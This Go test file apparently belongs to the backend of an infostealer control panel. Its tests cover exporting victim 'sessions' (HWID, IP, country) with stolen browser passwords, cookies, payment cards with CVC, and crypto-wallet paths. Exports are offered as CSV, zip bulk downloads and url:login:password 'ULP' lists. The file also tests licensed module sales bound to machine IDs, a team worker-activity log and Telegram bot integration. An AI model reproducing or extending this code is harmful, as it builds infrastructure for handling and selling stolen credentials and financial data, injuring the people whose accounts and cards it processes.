package api_test

import (
	"bytes"
	"database/sql"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/go-chi/chi/v5"
	"github.com/google/uuid"
	"zialfi-panel/internal/api"
	"zialfi-panel/internal/auth"
	"zialfi-panel/internal/middleware"
	"zialfi-panel/internal/services"
	"zialfi-panel/internal/testutil"
)

func withClaims(req *http.Request, uid, role string) *http.Request {
	return req.WithContext(middleware.ContextWithClaims(req.Context(), &auth.Claims{UserID: uid, Role: role}))
}

// ---------- Export ----------

func insertExportSession(t *testing.T, d *sql.DB, uid string) string {
	t.Helper()
	sid := uuid.New().String()
	if _, err := d.Exec("INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, owner_id, created_at) VALUES ($1, 'b1', 'hw1', 'win10', 'u', '1.2.3.4', 'US', $2, CURRENT_TIMESTAMP)", sid, uid); err != nil {
		t.Fatal(err)
	}
	return sid
}

func TestExport_JSON_NoClaims(t *testing.T) {
	d := testutil.OpenTestDB(t)
	h := api.NewExportHandler(d)
	r := chi.NewRouter()
	r.Get("/api/export/session/{id}", h.ExportSession)

	req := httptest.NewRequest(http.MethodGet, "/api/export/session/abc", nil)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusUnauthorized {
		t.Fatalf("expected 401, got %d", w.Code)
	}
}

func TestExport_JSON_LockedByOther(t *testing.T) {
	d := testutil.OpenTestDB(t)
	h := api.NewExportHandler(d)
	r := chi.NewRouter()
	r.Get("/api/export/session/{id}", h.ExportSession)

	uid := createTestUser(t, d, "explock", "pass")
	sid := insertExportSession(t, d, uid)
	if _, err := d.Exec("INSERT INTO session_locks (session_id, locked_by) VALUES ($1, $2)", sid, "someone-else"); err != nil {
		t.Fatal(err)
	}

	req := httptest.NewRequest(http.MethodGet, "/api/export/session/"+sid, nil)
	req = withClaims(req, uid, "user")
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusForbidden {
		t.Fatalf("expected 403, got %d: %s", w.Code, w.Body.String())
	}
}

func TestExport_JSON_NotFound(t *testing.T) {
	d := testutil.OpenTestDB(t)
	h := api.NewExportHandler(d)
	r := chi.NewRouter()
	r.Get("/api/export/session/{id}", h.ExportSession)

	uid := createTestUser(t, d, "exp404", "pass")
	req := httptest.NewRequest(http.MethodGet, "/api/export/session/nope", nil)
	req = withClaims(req, uid, "user")
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusNotFound {
		t.Fatalf("expected 404, got %d", w.Code)
	}
}

func TestExport_JSON_Forbidden(t *testing.T) {
	d := testutil.OpenTestDB(t)
	h := api.NewExportHandler(d)
	r := chi.NewRouter()
	r.Get("/api/export/session/{id}", h.ExportSession)

	owner := createTestUser(t, d, "expowner2", "pass")
	other := createTestUserWithRole(t, d, "expother2", "pass", "user")
	sid := insertExportSession(t, d, owner)

	req := httptest.NewRequest(http.MethodGet, "/api/export/session/"+sid, nil)
	req = withClaims(req, other, "user")
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusForbidden {
		t.Fatalf("expected 403, got %d", w.Code)
	}
}

func TestExport_JSON_RevealMaskedForNonPrivileged(t *testing.T) {
	d := testutil.OpenTestDB(t)
	h := api.NewExportHandler(d)
	r := chi.NewRouter()
	r.Get("/api/export/session/{id}", h.ExportSession)

	uid := createTestUser(t, d, "expmask", "pass")
	sid := insertExportSession(t, d, uid)
	if _, err := d.Exec("INSERT INTO passwords (id, session_id, url, username, password_value, browser) VALUES ($1, $2, 'https://example.com', 'alice', 'secret', 'chrome')",
		uuid.New().String(), sid); err != nil {
		t.Fatal(err)
	}

	req := httptest.NewRequest(http.MethodGet, "/api/export/session/"+sid+"?reveal_passwords=true", nil)
	req = withClaims(req, uid, "user")
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}
	var resp map[string]any
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatal(err)
	}
	pws := resp["passwords"].([]any)
	if len(pws) != 1 {
		t.Fatalf("expected 1 password, got %d", len(pws))
	}
	if pws[0].(map[string]any)["password_value"] != "[MASKED]" {
		t.Errorf("expected masked password, got %v", pws[0].(map[string]any)["password_value"])
	}
}

func TestExport_CSV_Full(t *testing.T) {
	d := testutil.OpenTestDB(t)
	h := api.NewExportHandler(d)
	r := chi.NewRouter()
	r.Get("/api/export/session/{id}", h.ExportSession)

	uid := createTestUser(t, d, "expcsv", "pass")
	sid := insertExportSession(t, d, uid)
	seedSessionData(t, d, sid)

	req := httptest.NewRequest(http.MethodGet, "/api/export/session/"+sid+"?format=csv&reveal_passwords=true", nil)
	req = withClaims(req, uid, "admin")
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}
	if ct := w.Header().Get("Content-Type"); !strings.Contains(ct, "text/csv") {
		t.Errorf("expected csv content type, got %q", ct)
	}
	body := w.Body.String()
	for _, want := range []string{"password,https://example.com,alice,secret", "cookie,,,,example.com,sid,abc", "card,,,,,,,4111,12/28,A B,,", "wallet,,,,,,,,,,MetaMask,C:/wallet"} {
		if !strings.Contains(body, want) {
			t.Errorf("csv body missing %q in %q", want, body)
		}
	}
}

func TestExport_CSV_Empty(t *testing.T) {
	d := testutil.OpenTestDB(t)
	h := api.NewExportHandler(d)
	r := chi.NewRouter()
	r.Get("/api/export/session/{id}", h.ExportSession)

	uid := createTestUser(t, d, "expcsv0", "pass")
	sid := insertExportSession(t, d, uid)

	req := httptest.NewRequest(http.MethodGet, "/api/export/session/"+sid+"?format=csv", nil)
	req = withClaims(req, uid, "user")
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}
	if !strings.Contains(w.Body.String(), "type,url,username,password") {
		t.Errorf("expected csv header, got %q", w.Body.String())
	}
}

func TestExport_ULP_Full(t *testing.T) {
	d := testutil.OpenTestDB(t)
	h := api.NewExportHandler(d)
	r := chi.NewRouter()
	r.Get("/api/export/session/{id}", h.ExportSession)

	uid := createTestUser(t, d, "expulp", "pass")
	sid := insertExportSession(t, d, uid)
	if _, err := d.Exec("INSERT INTO passwords (id, session_id, url, username, password_value, browser) VALUES ($1, $2, 'https://example.com', 'alice', 'secret', 'chrome')",
		uuid.New().String(), sid); err != nil {
		t.Fatal(err)
	}

	req := httptest.NewRequest(http.MethodGet, "/api/export/session/"+sid+"?format=ulp&reveal_passwords=true", nil)
	req = withClaims(req, uid, "admin")
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}
	if !strings.Contains(w.Body.String(), "https://example.com:alice:secret") {
		t.Errorf("expected ulp line, got %q", w.Body.String())
	}
}

func TestExport_ULP_Empty(t *testing.T) {
	d := testutil.OpenTestDB(t)
	h := api.NewExportHandler(d)
	r := chi.NewRouter()
	r.Get("/api/export/session/{id}", h.ExportSession)

	uid := createTestUser(t, d, "expulp0", "pass")
	sid := insertExportSession(t, d, uid)

	req := httptest.NewRequest(http.MethodGet, "/api/export/session/"+sid+"?format=ulp", nil)
	req = withClaims(req, uid, "user")
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}
	if w.Body.Len() != 0 {
		t.Errorf("expected empty ulp body, got %q", w.Body.String())
	}
}

func seedSessionData(t *testing.T, d *sql.DB, sid string) {
	t.Helper()
	ins := func(q string, args ...any) {
		t.Helper()
		if _, err := d.Exec(q, args...); err != nil {
			t.Fatal(err)
		}
	}
	ins("INSERT INTO passwords (id, session_id, url, username, password_value, browser) VALUES ($1, $2, 'https://example.com', 'alice', 'secret', 'chrome')", uuid.New().String(), sid)
	ins("INSERT INTO cookies (id, session_id, domain, name, value, path) VALUES ($1, $2, 'example.com', 'sid', 'abc', '/')", uuid.New().String(), sid)
	ins("INSERT INTO cards (id, session_id, number, exp_month, exp_year, holder, cvc) VALUES ($1, $2, '4111', '12', '28', 'A B', '123')", uuid.New().String(), sid)
	ins("INSERT INTO wallets (id, session_id, name, path) VALUES ($1, $2, 'MetaMask', 'C:/wallet')", uuid.New().String(), sid)
}

func TestExportBulk_InvalidJSON(t *testing.T) {
	d := testutil.OpenTestDB(t)
	h := api.NewExportHandler(d)
	r := chi.NewRouter()
	r.Post("/api/export/bulk", h.ExportBulk)

	req := httptest.NewRequest(http.MethodPost, "/api/export/bulk", bytes.NewReader([]byte(`bad`)))
	req = withClaims(req, createTestUser(t, d, "bulkbad", "pass"), "admin")
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusBadRequest {
		t.Fatalf("expected 400, got %d", w.Code)
	}
}

func TestExportBulk_EmptyIDs(t *testing.T) {
	d := testutil.OpenTestDB(t)
	h := api.NewExportHandler(d)
	r := chi.NewRouter()
	r.Post("/api/export/bulk", h.ExportBulk)

	req := httptest.NewRequest(http.MethodPost, "/api/export/bulk", bytes.NewReader([]byte(`{"ids":[]}`)))
	req = withClaims(req, createTestUser(t, d, "bulkempty", "pass"), "admin")
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusBadRequest {
		t.Fatalf("expected 400, got %d", w.Code)
	}
}

func TestExportBulk_Formats(t *testing.T) {
	d := testutil.OpenTestDB(t)
	h := api.NewExportHandler(d)
	r := chi.NewRouter()
	r.Post("/api/export/bulk", h.ExportBulk)

	uid := createTestUser(t, d, "bulkfmt", "pass")
	sid := insertExportSession(t, d, uid)
	seedSessionData(t, d, sid)

	for _, format := range []string{"", "csv", "ulp"} {
		path := "/api/export/bulk"
		if format != "" {
			path += "?format=" + format
		}
		req := httptest.NewRequest(http.MethodPost, path, bytes.NewReader([]byte(`{"ids":["`+sid+`"]}`)))
		req = withClaims(req, uid, "user")
		w := httptest.NewRecorder()
		r.ServeHTTP(w, req)
		if w.Code != http.StatusOK {
			t.Fatalf("bulk %q: expected 200, got %d: %s", format, w.Code, w.Body.String())
		}
		if ct := w.Header().Get("Content-Type"); !strings.Contains(ct, "application/zip") {
			t.Errorf("bulk %q: expected zip content type, got %q", format, ct)
		}
		if w.Body.Len() == 0 {
			t.Errorf("bulk %q: empty body", format)
		}
	}
}

func TestExportBulk_SkipsNonOwnedAndLocked(t *testing.T) {
	d := testutil.OpenTestDB(t)
	h := api.NewExportHandler(d)
	r := chi.NewRouter()
	r.Post("/api/export/bulk", h.ExportBulk)

	uid := createTestUser(t, d, "bulkskip", "pass")
	other := createTestUserWithRole(t, d, "bulkskip2", "pass", "user")
	mine := insertExportSession(t, d, uid)
	theirs := insertExportSession(t, d, other)
	locked := insertExportSession(t, d, uid)
	if _, err := d.Exec("INSERT INTO session_locks (session_id, locked_by) VALUES ($1, $2)", locked, "stranger"); err != nil {
		t.Fatal(err)
	}

	req := httptest.NewRequest(http.MethodPost, "/api/export/bulk?format=ulp", bytes.NewReader([]byte(`{"ids":["`+mine+`","`+theirs+`","`+locked+`"]}`)))
	req = withClaims(req, uid, "user")
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}
	// Non-owned and locked sessions are skipped: no crash, zip still produced.
	if w.Body.Len() == 0 {
		t.Error("expected non-empty zip")
	}
}

func TestExportUserAgents(t *testing.T) {
	d := testutil.OpenTestDB(t)
	h := api.NewExportHandler(d)
	r := chi.NewRouter()
	r.Get("/api/export/useragents", h.ExportUserAgents)

	uid := createTestUser(t, d, "expua", "pass")
	sid1 := insertExportSession(t, d, uid)
	sid2 := insertExportSession(t, d, uid)
	if _, err := d.Exec("INSERT INTO system_info (session_id, user_agent) VALUES ($1, $2)", sid1, "Mozilla/5.0 Chrome"); err != nil {
		t.Fatal(err)
	}
	if _, err := d.Exec("INSERT INTO system_info (session_id, user_agent) VALUES ($1, $2)", sid2, "Mozilla/5.0 Chrome"); err != nil {
		t.Fatal(err)
	}
	sid3 := insertExportSession(t, d, uid)
	if _, err := d.Exec("INSERT INTO system_info (session_id, user_agent) VALUES ($1, '')", sid3); err != nil {
		t.Fatal(err)
	}

	req := httptest.NewRequest(http.MethodGet, "/api/export/useragents", nil)
	req = withClaims(req, uid, "admin")
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}
	var resp []map[string]any
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatal(err)
	}
	if len(resp) != 1 || resp[0]["count"] != float64(2) {
		t.Errorf("expected 1 user agent with count 2, got %v", resp)
	}
}

func TestExportUserAgents_QueryError(t *testing.T) {
	d := testutil.OpenTestDB(t)
	h := api.NewExportHandler(d)
	r := chi.NewRouter()
	r.Get("/api/export/useragents", h.ExportUserAgents)

	uid := createTestUser(t, d, "expuaerr", "pass")
	d.Close()

	req := httptest.NewRequest(http.MethodGet, "/api/export/useragents", nil)
	req = withClaims(req, uid, "admin")
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusInternalServerError {
		t.Fatalf("expected 500, got %d", w.Code)
	}
}

// ---------- Worker activity ----------

func TestWorkerActivity_List(t *testing.T) {
	d := testutil.OpenTestDB(t)
	h := api.NewWorkerActivityHandler(d)
	r := chi.NewRouter()
	r.Get("/api/team/activity", h.List)

	uid := createTestUser(t, d, "wauser", "pass")
	if _, err := d.Exec("INSERT INTO worker_activity (user_id, action, target_id) VALUES ($1, 'session.view', $2)", uid, "s1"); err != nil {
		t.Fatal(err)
	}
	if _, err := d.Exec("INSERT INTO worker_activity (user_id, action, target_id) VALUES ($1, 'session.delete', NULL)", uid); err != nil {
		t.Fatal(err)
	}

	req := httptest.NewRequest(http.MethodGet, "/api/team/activity?page=1&limit=10&user_id="+uid+"&action=session.view", nil)
	req = withClaims(req, uid, "admin")
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}
	var resp map[string]any
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatal(err)
	}
	if int(resp["total"].(float64)) != 1 {
		t.Errorf("expected total 1 with filters, got %v", resp["total"])
	}
}

func TestWorkerActivity_List_Defaults(t *testing.T) {
	d := testutil.OpenTestDB(t)
	h := api.NewWorkerActivityHandler(d)
	r := chi.NewRouter()
	r.Get("/api/team/activity", h.List)

	uid := createTestUser(t, d, "wadef", "pass")
	for i := 0; i < 3; i++ {
		if _, err := d.Exec("INSERT INTO worker_activity (user_id, action) VALUES ($1, 'ping')", uid); err != nil {
			t.Fatal(err)
		}
	}

	req := httptest.NewRequest(http.MethodGet, "/api/team/activity", nil)
	req = withClaims(req, uid, "admin")
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}
	var resp map[string]any
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatal(err)
	}
	if int(resp["total"].(float64)) != 3 {
		t.Errorf("expected total 3, got %v", resp["total"])
	}
}

func TestWorkerActivity_List_QueryError(t *testing.T) {
	d := testutil.OpenTestDB(t)
	h := api.NewWorkerActivityHandler(d)
	r := chi.NewRouter()
	r.Get("/api/team/activity", h.List)

	d.Close()
	req := httptest.NewRequest(http.MethodGet, "/api/team/activity", nil)
	req = withClaims(req, "x", "admin")
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusInternalServerError {
		t.Fatalf("expected 500, got %d", w.Code)
	}
}

// ---------- Marketplace ----------

func insertProduct(t *testing.T, d *sql.DB, name string) string {
	t.Helper()
	pid := uuid.New().String()
	if _, err := d.Exec("INSERT INTO products (id, name, description, price_cents, product_type) VALUES ($1, $2, 'desc', 1999, 'module')", pid, name); err != nil {
		t.Fatal(err)
	}
	return pid
}

func insertPurchase(t *testing.T, d *sql.DB, userID, productID, key, tier string, activated bool, expires time.Time) {
	t.Helper()
	var activatedAt any
	if activated {
		activatedAt = time.Now().UTC().Format(time.RFC3339)
	}
	expiresAt := expires.Format(time.RFC3339)
	if _, err := d.Exec("INSERT INTO purchases (id, user_id, product_id, license_key, tier, features, activated_at, expires_at, created_at) VALUES ($1, $2, $3, $4, $5, '{}', $6, $7, $8)",
		uuid.New().String(), userID, productID, key, tier, activatedAt, expiresAt, time.Now().UTC().Format(time.RFC3339)); err != nil {
		t.Fatal(err)
	}
}

func TestMarketplace_Activate_SuccessAndAlreadyActivated(t *testing.T) {
	d := testutil.OpenTestDB(t)
	h := api.NewMarketplaceHandler(d)
	r := chi.NewRouter()
	r.Post("/api/marketplace/activate", h.Activate)

	uid := createTestUser(t, d, "actuser", "pass")
	pid := insertProduct(t, d, "Act")
	insertPurchase(t, d, uid, pid, "act-key-1", "starter", false, time.Now().Add(30*24*time.Hour))

	do := func() int {
		req := httptest.NewRequest(http.MethodPost, "/api/marketplace/activate", bytes.NewReader([]byte(`{"license_key":"act-key-1","hwid":"hw1"}`)))
		req = withClaims(req, uid, "user")
		w := httptest.NewRecorder()
		r.ServeHTTP(w, req)
		return w.Code
	}
	if code := do(); code != http.StatusOK {
		t.Fatalf("activate: expected 200, got %d", code)
	}
	if code := do(); code != http.StatusBadRequest {
		t.Fatalf("re-activate: expected 400, got %d", code)
	}
}

func TestMarketplace_Activate_Errors(t *testing.T) {
	d := testutil.OpenTestDB(t)
	h := api.NewMarketplaceHandler(d)
	r := chi.NewRouter()
	r.Post("/api/marketplace/activate", h.Activate)

	uid := createTestUser(t, d, "acterr", "pass")

	// no claims
	req := httptest.NewRequest(http.MethodPost, "/api/marketplace/activate", bytes.NewReader([]byte(`{}`)))
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusUnauthorized {
		t.Fatalf("no claims: expected 401, got %d", w.Code)
	}

	// invalid JSON
	req = httptest.NewRequest(http.MethodPost, "/api/marketplace/activate", bytes.NewReader([]byte(`bad`)))
	req = withClaims(req, uid, "user")
	w = httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusBadRequest {
		t.Fatalf("invalid json: expected 400, got %d", w.Code)
	}

	// missing fields
	req = httptest.NewRequest(http.MethodPost, "/api/marketplace/activate", bytes.NewReader([]byte(`{"license_key":"x"}`)))
	req = withClaims(req, uid, "user")
	w = httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusBadRequest {
		t.Fatalf("missing fields: expected 400, got %d", w.Code)
	}

	// not found
	req = httptest.NewRequest(http.MethodPost, "/api/marketplace/activate", bytes.NewReader([]byte(`{"license_key":"nope","hwid":"h"}`)))
	req = withClaims(req, uid, "user")
	w = httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusNotFound {
		t.Fatalf("not found: expected 404, got %d", w.Code)
	}

	// forbidden (someone else's license)
	other := createTestUserWithRole(t, d, "acterr2", "pass", "user")
	pid := insertProduct(t, d, "Act2")
	insertPurchase(t, d, other, pid, "act-key-2", "starter", false, time.Now().Add(30*24*time.Hour))
	req = httptest.NewRequest(http.MethodPost, "/api/marketplace/activate", bytes.NewReader([]byte(`{"license_key":"act-key-2","hwid":"h"}`)))
	req = withClaims(req, uid, "user")
	w = httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusForbidden {
		t.Fatalf("forbidden: expected 403, got %d", w.Code)
	}
}

func TestMarketplace_RenewLicense_NoClaimsAndExpiredBase(t *testing.T) {
	d := testutil.OpenTestDB(t)
	h := api.NewMarketplaceHandler(d)
	r := chi.NewRouter()
	r.Post("/api/marketplace/renew", h.RenewLicense)

	// no claims → 401
	req := httptest.NewRequest(http.MethodPost, "/api/marketplace/renew", bytes.NewReader([]byte(`{"license_key":"x"}`)))
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusUnauthorized {
		t.Fatalf("no claims: expected 401, got %d", w.Code)
	}

	// expired license (past expires_at): baseTime falls back to now
	uid := createTestUser(t, d, "renewexp", "pass")
	pid := insertProduct(t, d, "RenewExp")
	insertPurchase(t, d, uid, pid, "renew-exp-key", "pro", false, time.Now().Add(-48*time.Hour))
	req = httptest.NewRequest(http.MethodPost, "/api/marketplace/renew", bytes.NewReader([]byte(`{"license_key":"renew-exp-key"}`)))
	req = withClaims(req, uid, "user")
	w = httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("renew expired: expected 200, got %d: %s", w.Code, w.Body.String())
	}
}

func TestMarketplace_Upgrade_TeamAndLifetime(t *testing.T) {
	d := testutil.OpenTestDB(t)
	h := api.NewMarketplaceHandler(d)
	r := chi.NewRouter()
	r.Post("/api/marketplace/upgrade", h.UpgradeLicense)

	uid := createTestUser(t, d, "upg2", "pass")
	pid := insertProduct(t, d, "Upg2")
	insertPurchase(t, d, uid, pid, "upg-team-key", "starter", false, time.Now().Add(30*24*time.Hour))
	insertPurchase(t, d, uid, pid, "upg-lifetime-key", "pro", false, time.Now().Add(30*24*time.Hour))

	for _, tc := range []struct{ key, tier string }{
		{"upg-team-key", "team"},
		{"upg-lifetime-key", "lifetime"},
	} {
		body := `{"license_key":"` + tc.key + `","new_tier":"` + tc.tier + `"}`
		req := httptest.NewRequest(http.MethodPost, "/api/marketplace/upgrade", bytes.NewReader([]byte(body)))
		req = withClaims(req, uid, "user")
		w := httptest.NewRecorder()
		r.ServeHTTP(w, req)
		if w.Code != http.StatusOK {
			t.Fatalf("upgrade to %s: expected 200, got %d: %s", tc.tier, w.Code, w.Body.String())
		}
		var resp map[string]string
		json.Unmarshal(w.Body.Bytes(), &resp)
		if resp["tier"] != tc.tier {
			t.Errorf("upgrade to %s: tier = %q", tc.tier, resp["tier"])
		}
	}

	// no claims → 401
	req := httptest.NewRequest(http.MethodPost, "/api/marketplace/upgrade", bytes.NewReader([]byte(`{"license_key":"x","new_tier":"pro"}`)))
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusUnauthorized {
		t.Fatalf("no claims: expected 401, got %d", w.Code)
	}
}

func TestMarketplace_LicenseStatus_UnknownKey(t *testing.T) {
	d := testutil.OpenTestDB(t)
	h := api.NewMarketplaceHandler(d)
	r := chi.NewRouter()
	r.Get("/api/marketplace/license-status", h.LicenseStatus)

	uid := createTestUser(t, d, "lsunknown", "pass")

	req := httptest.NewRequest(http.MethodGet, "/api/marketplace/license-status?license_key=does-not-exist", nil)
	req = withClaims(req, uid, "user")
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d", w.Code)
	}
	var resp api.LicenseInfo
	json.Unmarshal(w.Body.Bytes(), &resp)
	if resp.Tier != "none" {
		t.Errorf("tier = %q, want none", resp.Tier)
	}

	// no claims → 401
	req = httptest.NewRequest(http.MethodGet, "/api/marketplace/license-status", nil)
	w = httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusUnauthorized {
		t.Fatalf("no claims: expected 401, got %d", w.Code)
	}
}

func TestMarketplace_MyPurchases_WithData(t *testing.T) {
	d := testutil.OpenTestDB(t)
	h := api.NewMarketplaceHandler(d)
	r := chi.NewRouter()
	r.Get("/api/marketplace/purchases", h.MyPurchases)

	uid := createTestUser(t, d, "mypurch", "pass")
	pid := insertProduct(t, d, "Purch")
	insertPurchase(t, d, uid, pid, "my-purch-key", "starter", false, time.Now().Add(30*24*time.Hour))

	req := httptest.NewRequest(http.MethodGet, "/api/marketplace/purchases", nil)
	req = withClaims(req, uid, "user")
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}
	var resp []api.Purchase
	json.Unmarshal(w.Body.Bytes(), &resp)
	if len(resp) != 1 || resp[0].LicenseKey != "my-purch-key" {
		t.Errorf("expected 1 purchase, got %v", resp)
	}

	// no claims → 401
	req = httptest.NewRequest(http.MethodGet, "/api/marketplace/purchases", nil)
	w = httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusUnauthorized {
		t.Fatalf("no claims: expected 401, got %d", w.Code)
	}
}

func TestMarketplace_DeleteProduct_Extra(t *testing.T) {
	d := testutil.OpenTestDB(t)
	h := api.NewMarketplaceHandler(d)
	r := chi.NewRouter()
	r.Delete("/api/marketplace/products/{id}", h.DeleteProduct)

	pid := insertProduct(t, d, "Del")

	req := httptest.NewRequest(http.MethodDelete, "/api/marketplace/products/"+pid, nil)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("delete: expected 200, got %d: %s", w.Code, w.Body.String())
	}

	req = httptest.NewRequest(http.MethodDelete, "/api/marketplace/products/"+pid, nil)
	w = httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusNotFound {
		t.Fatalf("delete again: expected 404, got %d", w.Code)
	}
}

func TestMarketplace_Purchase_Tiers(t *testing.T) {
	d := testutil.OpenTestDB(t)
	h := api.NewMarketplaceHandler(d)
	r := chi.NewRouter()
	r.Post("/api/marketplace/purchase", h.Purchase)

	uid := createTestUser(t, d, "purchtiers", "pass")
	pid := insertProduct(t, d, "Tiers")

	for _, tier := range []string{"starter", "pro", "team", "lifetime"} {
		body := `{"product_id":"` + pid + `","tier":"` + tier + `"}`
		req := httptest.NewRequest(http.MethodPost, "/api/marketplace/purchase", bytes.NewReader([]byte(body)))
		req = withClaims(req, uid, "user")
		w := httptest.NewRecorder()
		r.ServeHTTP(w, req)
		if w.Code != http.StatusCreated {
			t.Fatalf("purchase %s: expected 201, got %d: %s", tier, w.Code, w.Body.String())
		}
		var resp map[string]string
		json.Unmarshal(w.Body.Bytes(), &resp)
		if resp["tier"] != tier {
			t.Errorf("purchase %s: tier = %q", tier, resp["tier"])
		}
	}
}

func TestMarketplace_StartTrial_MachineID(t *testing.T) {
	d := testutil.OpenTestDB(t)
	h := api.NewMarketplaceHandler(d)
	r := chi.NewRouter()
	r.Post("/api/marketplace/trial", h.StartTrial)

	uid := createTestUser(t, d, "trialmach", "pass")
	// Another user already trialed from this IP.
	if _, err := d.Exec("INSERT INTO license_trials (id, user_id, ip, machine_id, expires_at) VALUES ($1, $2, '203.0.113.10', 'mach-A', $3)",
		uuid.New().String(), "someone-else", time.Now().Add(7*24*time.Hour).Format(time.RFC3339)); err != nil {
		t.Fatal(err)
	}

	// New machine id from same IP → allowed.
	req := httptest.NewRequest(http.MethodPost, "/api/marketplace/trial?machine_id=mach-B", nil)
	req.Header.Set("X-Forwarded-For", "203.0.113.10")
	req = withClaims(req, uid, "user")
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusCreated {
		t.Fatalf("new machine: expected 201, got %d: %s", w.Code, w.Body.String())
	}

	// Machine id already used → blocked.
	uid2 := createTestUser(t, d, "trialmach2", "pass")
	req = httptest.NewRequest(http.MethodPost, "/api/marketplace/trial?machine_id=mach-A", nil)
	req.Header.Set("X-Forwarded-For", "203.0.113.10")
	req = withClaims(req, uid2, "user")
	w = httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusBadRequest {
		t.Fatalf("used machine: expected 400, got %d", w.Code)
	}

	// no claims → 401
	req = httptest.NewRequest(http.MethodPost, "/api/marketplace/trial", nil)
	w = httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusUnauthorized {
		t.Fatalf("no claims: expected 401, got %d", w.Code)
	}
}

// ---------- Telegram bots ----------

func insertTelegramBot(t *testing.T, d *sql.DB, id, name, token, chatID string) {
	t.Helper()
	if _, err := d.Exec("INSERT INTO telegram_bots (id, name, token, chat_id, tier, is_active) VALUES ($1, $2, $3, $4, 'basic', TRUE)",
		id, name, token, chatID); err != nil {
		t.Fatal(err)
	}
}

func TestBot_Update_Success(t *testing.T) {
	d := testutil.OpenTestDB(t)
	h := api.NewTelegramBotHandler(d)
	r := chi.NewRouter()
	r.Put("/api/telegram/bots/{id}", h.Update)

	bid := uuid.New().String()
	insertTelegramBot(t, d, bid, "bot", "123456:ABC", "-100")

	req := httptest.NewRequest(http.MethodPut, "/api/telegram/bots/"+bid, bytes.NewReader([]byte(`{"is_active":false}`)))
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}
	var resp map[string]any
	json.Unmarshal(w.Body.Bytes(), &resp)
	if resp["is_active"] != false {
		t.Errorf("is_active = %v, want false", resp["is_active"])
	}
	var active int
	d.QueryRow("SELECT is_active FROM telegram_bots WHERE id = $1", bid).Scan(&active)
	if active != 0 {
		t.Errorf("expected is_active=0 in db, got %d", active)
	}
}

func TestBot_Update_DBError(t *testing.T) {
	d := testutil.OpenTestDB(t)
	h := api.NewTelegramBotHandler(d)
	r := chi.NewRouter()
	r.Put("/api/telegram/bots/{id}", h.Update)

	d.Close()
	req := httptest.NewRequest(http.MethodPut, "/api/telegram/bots/x", bytes.NewReader([]byte(`{"is_active":true}`)))
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusInternalServerError {
		t.Fatalf("expected 500, got %d", w.Code)
	}
}

